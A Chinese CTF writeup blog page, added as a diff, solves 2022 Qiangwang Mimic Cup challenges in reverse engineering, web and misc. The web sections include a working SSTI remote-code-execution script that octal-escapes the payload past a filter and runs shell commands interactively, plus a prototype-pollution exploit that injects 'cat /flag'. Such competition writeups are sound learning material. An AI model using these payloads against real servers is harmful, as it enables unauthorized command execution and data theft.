@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="[Re] Comeongo
+反编译找到两串疑似密文的字符串
+
+动调跟随逻辑到这里">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Timlzh">
+    
+
+    <!-- Title -->
+    
+    <title>2022 第五届强网拟态杯 WP | CTF Writeup | Tim的杂货铺</title>
+
+    <!-- favicon -->
+    
+        <link rel="shortcut icon" href="https://timlzh.github.io/melody-favicon.ico">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Valine -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+    <link rel="stylesheet" href="/server-archive/css/darkmode.css">
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/server-archive/css/style.css">
+
+
+    <!-- Top Menu  -->
+    <div class="top_menu">
+        
+            
+            <a href="/server-archive/">Home</a>
+            
+            <a href="/server-archive/links">Friends</a>
+            
+            <a href="/server-archive/tags">Tags</a>
+            
+            <a href="/server-archive/about">About</a>
+            
+            <a href="/server-archive/">asdfa</a>
+            
+        
+        <a class="darkmode-toggle" href="#" data-toggle="darkmode">
+            <i class="fa fa-moon-o"></i>
+            <i class="fa fa-sun-o" style="display: none;"></i>
+        </a>
+    </div>
+
+    <!-- Darkmode -->
+    <script src='/server-archive/js/darkmode.js'></script>
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.jsdelivr.net/npm/font-awesome@4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- jQuery -->
+    <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+    <!-- Bootstrap -->
+    <script src="//cdn.jsdelivr.net/npm/bootstrap@3.3.6/dist/js/bootstrap.min.js"></script>
+
+    <!-- Highlight -->
+    
+        <script>
+            var lightTheme = "github";
+            var darkTheme = "github-dark-dimmed";
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/server-archive/atom.xml" title="Tim的杂货铺" type="application/atom+xml">
+</head>
+
+
+<body>
+
+    <!-- Content -->
+    
+
+
+<section class="article-container">
+    <!-- Back Home -->
+    <!-- <a class="nav-back" href="javascript:back()">
+    <i class="fa fa-arrow-left"></i>
+</a>
+
+<script>
+    function back() {
+        var home = '/server-archive/'
+        if (document.referrer && document.referrer.indexOf(home) > -1) {
+            window.history.back();
+        } else {
+            window.location.href = home;
+        }
+    }
+</script> -->
+
+        <!-- Page Header -->
+        <header class="intro-header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <div class="post-heading">
+                            <h1>
+                                2022 第五届强网拟态杯 WP
+                            </h1>
+                            <div class="subheading">
+                                CTF Writeup
+                            </div>
+                            <hr>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <article>
+            <div class="container">
+                <div class="row">
+                    <!-- Post Main Content -->
+                    <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <h1 id="%5Bre%5D-comeongo" tabindex="-1">[Re] Comeongo</h1>
+<p>反编译找到两串疑似密文的字符串</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pfkay-2.png" alt="image"></p>
+<p>动调跟随逻辑到这里</p>
+<span id="more"></span>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pfoqw-2.png" alt="image"></p>
+<p>可以知道name和passwd都是16位字符串</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pfuyy-2.png" alt="image"></p>
+<p>继续往下走, check1中的加密有一个字母表, 特点是无0和O, 可以猜到是base58加密</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pftco-2.png" alt="image"></p>
+<p>尝试后可以知道这一段是name[:8]+passwd[:8], 动调测试发现正确</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pg3oh-2.png" alt="image"></p>
+<p>name[:8] = <code>GoM0bi13</code><br>
+passwd[:8] = <code>G3tItEzF</code></p>
+<p>第二段密文</p>
+<p>b64Decode(X051YmNmRnE=)=  _NubcfFq</p>
+<p>输入<code>GoM0bi13aaaa0000</code>和<code>G3tItEzFaaaa0000</code>可以发现加密成了</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pg4x7-2.png" alt="image"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pge49-2.png" alt="image"></p>
+<p>也就是八个m, 说明这里加密的是name[8:12]+passwd[8:12], 并且对字母进行了一定偏移, 这里直接打表</p>
+<pre><code>abcdefghijklmnopqrstuvwxyz
+mnopqrstuvwxybcdefghijklmn
+</code></pre>
+<p>对照后看得出_NubcfFq是_BinorRe</p>
+<p>所以name[8:12]=_Bin, passwd[8:12]=orRe</p>
+<p>name[:12] = <code>GoM0bi13_Bin</code><br>
+passwd[:12] = <code>G3tItEzForRe</code></p>
+<p>继续动调后面两位, 可以发现加密对应关系</p>
+<p>name[12] a→0xD7 b→0xD8 c→0xD9 … z→0xF0 … A→0xB7<br>
+name[13] a→A9</p>
+<p>密文是0xDD和0x8F, 所以name[12:14]=gGo1</p>
+<p>继续读代码, 可以发现两个逻辑, 一个是<code>name[-2]+passwd[-2]</code>的和是确定的等于159, 第二个是<code>name[-2]-passwd[-2]</code>的差是确定的63, 解方程出来可以知道是<code>name[-2]=o</code>, <code>passwd[-2]=0</code>, 同理<code>name[-1]+passwd[-1]=97</code>和<code>name[-1]-passwd[-1]=0x1F</code>解得<code>name[-1]=@</code>, <code>passwd[-1]=!</code></p>
+<p>此时基本解密完成:</p>
+<pre><code>name = GoM0bi13_BingGo@
+passwd = G3tItEzForRe??0!
+</code></pre>
+<p>直接测试发现出现多解了(旧附件)</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pgaj6-2.png" alt="image"></p>
+<p>最后猜测为<code>flag&#123;GoM0bi13_BingGo@G3tItEzForRevG0!&#125;</code></p>
+<h1 id="%5Bre%5D-unlambda" tabindex="-1">[Re] unlambda</h1>
+<p>结构:I(xxxxxxxx) 返回一个数组中的T或者F</p>
+<p>可以把I改成<code>I = x(lambda _:_ + 1)(0)</code>返回的就是数组下标了</p>
+<p>然后把每个check当做字符串处理, 提取出I(xxxxxxxx), 利用eval执行, 获得执行结果(下标), 就可以将其替换成<code>arr[x]</code></p>
+<p>继续寻找逻辑发现每一个I之前都会有一段l(l(l(l(l))))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))))(l(l(l(l))))))(l(l(l(l(l))))))(l(l(l(l)))(l(l(l(l)))))</p>
+<p>测试发现l(l(l(l(l))))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))))(l(l(l(l))))))(l(l(l(l(l))))))(l(l(l(l)))(l(l(l(l)))))(T/F)(a)(b)相当于执行T/F</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pg8px-2.png" alt="image"></p>
+<p>所以为了方便处理可以把l(l(l(l(l))))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))))(l(l(l(l))))))(l(l(l(l(l))))))(l(l(l(l)))(l(l(l(l)))))(xxx)正则替换成run(xxx)</p>
+<pre><code class="language-py">import re
+
+arr = []
+l = lambda x : (x (lambda y : lambda a: lambda b : (y (b)) (a (b))))(lambda c : lambda __: c)
+
+I = lambda x : x(lambda _:_ + 1)(0)
+
+
+subed = &quot;&quot;
+cnt = 0
+with open('var.txt', 'r') as f: # var.txt每一行对应了一个check变量的值
+    content = f.read()
+    c = 0
+    while c &lt; len(content.strip()):
+        if content[c] != &quot;I&quot;:
+            subed += content[c]
+            c += 1
+        else:
+            c += 2
+            stack = 1
+            code = &quot;I(&quot;
+            while stack != 0:
+                if content[c] == &quot;(&quot;:
+                    stack += 1
+                elif content[c] == &quot;)&quot;:
+                    stack -= 1
+                code += content[c]
+                c += 1
+            result = eval(code)
+            subed += f&quot;arr[&#123;str(result)&#125;]&quot;
+subed = subed.replace(&quot;l(l(l(l(l))))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))))(l(l(l(l))))))(l(l(l(l(l))))))(l(l(l(l)))(l(l(l(l)))))&quot;,&quot;run&quot;)
+print(subed)
+</code></pre>
+<p>现在check0长这样：</p>
+<blockquote>
+<p>run(arr[6])(l(l(l(l)))(l(l)))(run(arr[24])(l(l(l(l)))(l(l)))(run(arr[30])(l(l(l(l)))(l(l)))(run(arr[37])(l(l(l(l)))(l(l)))(run(arr[16])(l(l(l(l)))(l(l)))(run(arr[41])(l(l(l(l)))(l(l)))(run(arr[10])(run(arr[47])(run(arr[0])(run(arr[38])(l(l(l(l)))(l(l)))(run(arr[7])(run(arr[23])(run(arr[27])(run(arr[40])(l(l(l(l)))(l(l)))(run(arr[57])(run(arr[31])(run(arr[9])(run(arr[12])(l(l(l(l)))(l(l)))(run(arr[28])(l(l(l(l)))(l(l)))(run(arr[46])(l(l(l(l)))(l(l)))(run(arr[59])(run(arr[61])(l(l(l(l)))(l(l)))(run(arr[22])(l(l(l(l)))(l(l)))(run(arr[35])(l(l(l(l)))(l(l)))(run(arr[56])(l(l(l(l)))(l(l)))(run(arr[39])(run(arr[19])(l(l(l(l)))(l(l)))(run(arr[3])(l(l(l(l)))(l(l)))(run(arr[51])(run(arr[63])(run(arr[60])(run(arr[52])(run(arr[29])(l(l(l(l)))(l(l)))(run(arr[62])(l(l(l(l)))(l(l)))(run(arr[13])(l(l(l(l)))(l(l)))(run(arr[34])(run(arr[1])(run(arr[50])(l(l(l(l)))(l(l)))(run(arr[21])(run(arr[11])(run(arr[25])(l(l(l(l)))(l(l)))(run(arr[42])(l(l(l(l)))(l(l)))(run(arr[32])(l(l(l(l)))(l(l)))(run(arr[14])(run(arr[8])(run(arr[58])(l(l(l(l)))(l(l)))(run(arr[5])(run(arr[53])(run(arr[17])(l(l(l(l)))(l(l)))(run(arr[18])(l(l(l(l)))(l(l)))(run(arr[33])(run(arr[15])(run(arr[2])(l(l(l(l)))(l(l)))(run(arr[55])(run(arr[45])(run(arr[26])(l(l(l(l)))(l(l)))(run(arr[4])(run(arr[36])(l(l(l(l)))(l(l)))(run(arr[49])(run(arr[54])(l(l(l(l)))(l(l)))(run(arr[20])(l(l(l(l)))(l(l)))(run(arr[44])(l(l(l(l)))(l(l)))(run(arr[43])(l(l(l(l)))(l(l)))(run(arr[48])(l(l(l(l))))(l(l(l(l)))(l(l))))))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))))(l(l(l(l)))(l(l))))))))(l(l(l(l)))(l(l)))))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l))))(l(l(l(l)))(l(l)))))))))</p>
+</blockquote>
+<p>找到最终节run(arr[48])(l(l(l(l))))(l(l(l(l)))(l(l)))</p>
+<p>l(l(l(l)))和F作用是一样的, l(l(l(l)))(l(l))和T的作用是一样的</p>
+<p>又因为最后</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pggvi-2.png" alt="image"></p>
+<p>所以最后总返回值必须是run(F), 因此arr[48]这里必须返回l(l(l(l))), 所以arr[48]是F, 也就是0, 这一整段就可以被替换成l(l(l(l))), 然后就变成了run(arr[43])(l(l(l(l)))(l(l)))(l(l(l(l)))), 那么arr[43]就是T, 也就是1, 可以以此类推, 递推下去</p>
+<p>exp:</p>
+<pre><code class="language-py">import re
+arr = []
+l = lambda x : (x (lambda y : lambda a: lambda b : (y (b)) (a (b))))(lambda c : lambda __: c)
+I = lambda x : x(lambda _:_ + 1)(0)
+subed = &quot;&quot;
+with open('var.txt', 'r') as f: # var.txt每一行对应了一个check变量的值
+    lines = f.readlines()
+    for line in lines:
+        content = line.strip()
+        c = 0
+        while c &lt; len(content.strip()):
+            if content[c] != &quot;I&quot;:
+                subed += content[c]
+                c += 1
+            else:
+                c += 2
+                stack = 1
+                code = &quot;I(&quot;
+                while stack != 0:
+                    if content[c] == &quot;(&quot;:
+                        stack += 1
+                    elif content[c] == &quot;)&quot;:
+                        stack -= 1
+                    code += content[c]
+                    c += 1
+                result = eval(code)
+                subed += f&quot;arr[&#123;str(result)&#125;]&quot;
+        subed = subed.replace(&quot;l(l(l(l(l))))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))(l(l(l(l)))(l(l(l(l(l))))))(l(l(l(l))))))(l(l(l(l(l))))))(l(l(l(l)))(l(l(l(l)))))&quot;,&quot;run&quot;)
+        subed += &quot;))))))&quot; # 怕括号不匹配, 多加几个在后面
+
+        subArr = [0]*64
+
+        while &quot;run&quot; in subed:
+            if len(re.findall(r&quot;run\(arr\[([0-9]*)\]\)\(l\(l\(l\(l\)\)\)\)\(l\(l\(l\(l\)\)\)\(l\(l\)\)\)&quot;, subed)) &gt; 0:
+                index = int(re.findall(r&quot;run\(arr\[([0-9]*)\]\)\(l\(l\(l\(l\)\)\)\)\(l\(l\(l\(l\)\)\)\(l\(l\)\)\)&quot;, subed)[0])
+                subed = subed.replace(f&quot;run(arr[&#123;index&#125;])(l(l(l(l))))(l(l(l(l)))(l(l)))&quot;, f&quot;l(l(l(l)))&quot;)
+                subArr[index] = 0
+            else:
+                index = int(re.findall(r&quot;run\(arr\[([0-9]*)\]\)\(l\(l\(l\(l\)\)\)\(l\(l\)\)\)\(l\(l\(l\(l\)\)\)\)&quot;, subed)[0])
+                subed = subed.replace(f&quot;run(arr[&#123;index&#125;])(l(l(l(l)))(l(l)))(l(l(l(l))))&quot;, f&quot;l(l(l(l)))&quot;)
+                subArr[index] = 1
+        arr.extend(subArr)
+
+flag = &quot;&quot;
+for i in range(0, len(arr), 8):
+    c = arr[i+7] &lt;&lt; 7 | arr[i+6] &lt;&lt; 6 | arr[i+5] &lt;&lt; 5 | arr[i+4] &lt;&lt; 4 | arr[i+3] &lt;&lt; 3 | arr[i+2] &lt;&lt; 2 | arr[i+1] &lt;&lt; 1 | arr[i]
+    flag += chr(c)
+print(flag)
+</code></pre>
+<h1 id="%5Bweb%5D-%E6%B2%A1%E6%9C%89%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82py" tabindex="-1">[Web] 没有人比我更懂py</h1>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pgnmu-2.png" alt="image"></p>
+<p>可以发现有ssti, 但是屏蔽了所有英文字母, 只有中文/符号/数字可以用.</p>
+<p>采用八进制转义就能绕过限制</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pgyd3-2.png" alt="image"></p>
+<p>通过<code>&#123;&#123;""["__class__"]["__mro__"][1]["__subclasses__"]()&#125;&#125;</code>扒下所有的可用类, 找到了一个<code>warnings.catch_warnings</code>可以用来任意代码执行, 下标是213</p>
+<p><a target="_blank" rel="noopener" href="http://shell.py">shell.py</a></p>
+<pre><code class="language-python">import requests
+import re
+
+def prepare_payload(payload):
+    res = &quot;&quot;
+    for c in payload:
+        if c.isalpha():
+            res += &quot;\\&quot;+oct(ord(c))[2:]
+        else:
+            res += c
+    return res
+
+while True:
+	cmd = str(input())
+	payload = r&quot;&quot;&quot;&#123;&#123;""["__class__"]["__mro__"][1]["__subclasses__"]()[213]["__init__"]['__globals__']['__builtins__']['eval']("__import__('os').popen('"""+cmd+"""').read()")&#125;&#125;&quot;&quot;&quot;
+	data = &#123;&quot;data&quot;: f&quot;&#123;prepare_payload(payload)&#125;&quot;&#125;
+	url = &quot;http://172.51.227.173/&quot;
+	x = requests.post(url=url, data=data)
+
+	res = re.findall(r'        &lt;p&gt;(.*)&lt;/p&gt;', x.text,re.S)[0]
+	print(res)
+</code></pre>
+<h1 id="%5Bweb%5D-whoyouare" tabindex="-1">[Web] WHOYOUARE</h1>
+<pre><code>if (typeof cmd !== 'string' || cmd.length &gt; 4 ||RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) &#123;
+    return false;
+&#125;
+</code></pre>
+<p>可以发现cmd长度限定了4</p>
+<p>找了个CVE, 可以通过构造原型链来绕过<a target="_blank" rel="noopener" href="https://github.com/fastify/fastify/security/advisories/GHSA-455w-c45v-86rg">Deny of service via malicious Content-Type</a></p>
+<p><a target="_blank" rel="noopener" href="http://exp.py">exp.py</a></p>
+<pre><code>import json, requests
+
+command = &#123;
+    'constructor': &#123;
+        'prototype': &#123;
+            '2': 'cat /flag'
+        &#125;
+    &#125;,
+    'command': ['-c', '-c']
+&#125;
+
+cmd = &#123;&quot;user&quot;: json.dumps(command)&#125;
+url = &quot;http://addr/user&quot;
+res = requests.post(url=url, json=cmd)
+res = res.json()
+print(res)
+</code></pre>
+<h1 id="%5Bmisc%5D-babymisc" tabindex="-1">[Misc] babyMisc</h1>
+<p>猜数字, 有次数限制, 一直二分试就行了, 不到一分钟就跑出来了</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12pgy1x-2.png" alt="image"></p>
+<pre><code class="language-py">from pwn import *
+
+def main():
+    r = remote('172.51.227.55', 9999)
+
+    min = 0
+    max = 999999
+    r.recvline()
+    r.sendline(b&quot;Y&quot;)
+    r.recvline()
+    r.recvline()
+    while True:
+        r.sendline(str(int((min+max)/2)))
+        x = str(r.recvline())
+        if &quot;low&quot; in x:
+            min = int((min+max)/2)
+        elif &quot;up&quot; in x:
+            max = int((min+max)/2)
+        else:
+            print(int((min+max)/2))
+            break
+        print(f&quot;&#123;min&#125; &#123;max&#125; &#123;x&#125;&quot;)
+    return r, x
+
+x = &quot;lost&quot;
+while &quot;lost&quot; in x:
+    r, x = main()
+    
+r.interactive()
+</code></pre>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+
+                            <!-- Meta -->
+                            <div class="post-meta">
+                                <hr>
+                                <br>
+                                <div class="post-tags">
+                                    
+                                        
+
+<a href="/server-archive/tags/CTF/">#CTF</a> <a href="/server-archive/tags/Writeup/">#Writeup</a>
+
+
+                                            
+                                </div>
+                                <div class="post-date">
+                                    
+                                        2022-11-06
+                                    
+                                </div>
+                            </div>
+                    </div>
+
+                    <!-- Comments -->
+                    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                        <!-- Disqus Comments -->
+
+<div id="vcomments" class="comment"></div>
+<script>
+  new Valine({
+    el: '.comment',
+    appId: 'TSp33hlPwuAsaq6YiQt7qxqB-gzGzoHsz',
+    appKey: '4pv9GKDHCxnThP1EN1u9uYSN',
+    placeholder: 'random',
+    avatar: '',
+    enableQQ: true,
+    emojiCDN: '//i0.hdslb.com/bfs/emote/',
+    // 表情title和图片映射
+    emojiMaps: {
+      "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+      "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+      "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+      "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+      "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+      "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+      "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+      "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+      "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+      "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+      "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+      "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+      "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+      "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+      "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+      "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+      "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+      "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+      "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+      "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+      "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+      "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+      "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+      "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+      "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+      "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+      "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+      "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+      "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+      "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+      "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+      "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+      "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+      "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+      "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+      "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+      "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+      "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+      "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+      "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+      "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+      "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+      "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+      "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+      "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+      "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+      "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+      "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+      "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+      "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+      // ... 更多表情
+    }
+  })
+  if('random' == 'random'){
+    var veditor = document.getElementById("veditor");
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+        veditor.placeholder = '『' + data.hitokoto + '』' + '\n\n\n' + 'From  ' + data.from;
+        })
+        .catch(console.error)
+  }
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+</section>
+
+<!-- Image viewer-->
+
+    
+    <!-- Custom picture view-->
+    <link href="/server-archive/css/viewer.min.css" rel="stylesheet" />
+    <script
+      src="/server-archive/js/viewer.min.js"
+      type="text/javascript"
+      charset="utf-8"
+    ></script>
+    
+    <script type="text/javascript">
+      // set image viewer
+      Viewer.setDefaults({
+        zoomRatio: [0.5],
+        navbar: false,
+        toolbar: false,
+        button: false,
+        title: [2, (image, imageData) => `${image.alt}`],
+        show: function() {
+          this.viewer.zoomTo(0.5);
+        }
+      });
+      var imageList = document.getElementsByTagName("img");
+      Array.prototype.forEach.call(imageList, element => {
+        var viewer = new Viewer(element);
+      });
+    </script>
+
+    
+
+
+<!-- TOC -->
+<!-- 
+    <aside id="article-toc" role="navigation" class="fixed">
+        <div id="article-toc-inner">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%5Bre%5D-comeongo"><span class="toc-text">[Re] Comeongo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%5Bre%5D-unlambda"><span class="toc-text">[Re] unlambda</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%5Bweb%5D-%E6%B2%A1%E6%9C%89%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82py"><span class="toc-text">[Web] 没有人比我更懂py</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%5Bweb%5D-whoyouare"><span class="toc-text">[Web] WHOYOUARE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%5Bmisc%5D-babymisc"><span class="toc-text">[Misc] babyMisc</span></a></li></ol>
+        </div>
+    </aside>
+ -->
+
+
+    <script>
+        hljs.highlightAll();
+    </script>
+
+    <!-- Scripts -->
+    <script type="text/javascript">
+    console.log("© Timlzh 🙋 2022-" + new Date().getFullYear());
+    console.log("Welcome to my blog: https://timlzh.com");
+</script>
+  
+    <!-- Google Analytics -->
+    
+
+    <!-- Service Worker -->
+    <!-- if using service worker -->
+
+    
+    <!-- Go Top -->
+    <a class="go-top">
+    <i class="fa fa-arrow-up"></i>
+</a>
+
+<script type="text/javascript">
+    if ($(window).scrollTop() <= 100) {
+        $(".go-top").hide();
+    }
+    
+    $(function () {
+        $(window).scroll(function () {
+            if ($(window).scrollTop() > 100) {
+                $(".go-top").fadeIn(500);
+            } else {
+                $(".go-top").fadeOut(500);
+            }
+        });
+        $(".go-top").click(function () {
+            $('body,html').animate({scrollTop: 0}, 500);
+            return false;
+        });
+    });
+</script>
+</body>
+
+<footer>
+    
+    
+    
+        <div class="beian">
+            <a href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备2022036129号-2</a>
+        </div>
+    
+
+</footer>
+
+</html>
